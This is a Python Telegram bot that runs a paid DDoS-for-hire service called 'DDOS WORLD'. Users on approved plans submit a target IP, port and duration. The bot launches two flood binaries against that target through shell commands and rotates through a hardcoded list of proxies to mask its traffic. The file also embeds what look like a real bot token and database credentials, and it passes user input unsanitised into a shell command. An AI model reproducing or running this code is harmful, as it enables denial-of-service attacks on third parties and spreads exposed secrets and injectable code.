import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7545154337:AAHQmoFquGWEubN3h1aaDun9Q6IjtJC2hH8'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002161693758
CHANNEL_ID = -1002161693758
error_channel_id = -1002161693758

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['danger']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    # Define commands for each binary
    sasuke_command = f"./sasuke {target_ip} {target_port} {duration}"
    sasuke2_command = f"./sasuke2 {target_ip} {target_port} {duration} 600 800"

    # Run both commands concurrently
    try:
        sasuke_process = await asyncio.create_subprocess_shell(sasuke_command)
        sasuke2_process = await asyncio.create_subprocess_shell(sasuke2_command)
        await asyncio.gather(sasuke_process.communicate(), sasuke2_process.communicate())
    finally:
        bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*🚫 Access Denied!*\n*You don't have permission to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*⚠️ Invalid format. Use one of these commands:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1 and users_collection.count_documents({"plan": 1}) >= 99:
            bot.send_message(chat_id, "*🚫 Approval Failed: Instant Plan limit reached (99 users).*", parse_mode='Markdown')
            return
        elif plan == 2 and users_collection.count_documents({"plan": 2}) >= 499:
            bot.send_message(chat_id, "*🚫 Approval Failed: Instant++ Plan limit reached (499 users).*", parse_mode='Markdown')
            return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*🎉 User {target_user_id} approved!*\n*Plan: {plan} for {days} days.*")
    else:
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*❌ User {target_user_id} has been disapproved.*")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    user_data = users_collection.find_one({"user_id": user_id})
    if not user_data or user_data['plan'] == 0:
        bot.send_message(chat_id, "*🚫 Access Denied! You need approval to use this bot.*\n*Contact: @TANISHULTRA54*", parse_mode='Markdown')
        return

    if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
        bot.send_message(chat_id, "*🧡 Instant Plan full. Upgrade for access.*", parse_mode='Markdown')
        return
    if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
        bot.send_message(chat_id, "*💥 Instant++ Plan full. Try later or upgrade.*", parse_mode='Markdown')
        return

    if bot.attack_in_progress:
        bot.send_message(chat_id, "*⚠️ Bot busy with another attack. Check remaining time with /when.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*💣 Ready to launch? Provide target IP, port, and duration.*\n*Example: 167.67.25 6296 60*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, "*❗ Error! Use correct format.*\n*Example: IP PORT DURATION*", parse_mode='Markdown')
        return

    target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

    if target_port in blocked_ports:
        bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.* Choose another port.", parse_mode='Markdown')
        return
    if duration >= 600:
        bot.send_message(message.chat.id, "*⏳ Max duration is 599 seconds. Shorten and try again.*", parse_mode='Markdown')
        return  

    bot.attack_in_progress = True
    bot.attack_duration = duration
    bot.attack_start_time = time.time()

    asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
    bot.send_message(message.chat.id, f"*🚀 Attack Launched!*\n*Target: {target_ip}:{target_port} for {duration}s*", parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 Attack completed! Ready for another!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack in progress. Initiate one when ready.*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "*🌍 Welcome to DDOS WORLD!* 🎉\n\n"
                                      "*Use `/attack` with target's IP and port to launch.*\n"
                                      "*Example: /attack 167.67.25 6296 60*\n"
                                      "*Check /help for commands.*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
        logging.info("Retrying in 10 seconds...")
        time.sleep(10)
